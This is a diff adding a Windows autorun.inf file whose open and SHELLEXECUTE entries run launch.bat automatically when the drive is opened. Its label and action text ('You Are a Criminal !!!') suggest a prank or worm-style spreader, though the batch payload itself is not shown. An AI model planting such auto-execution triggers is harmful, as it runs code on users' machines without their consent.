@@ -1,0 +1,5 @@
+[autorun]
+label= BatchMan& Robby
+action= You Are a Criminal !!!
+open="launch.bat"
+SHELLEXECUTE=launch.bat
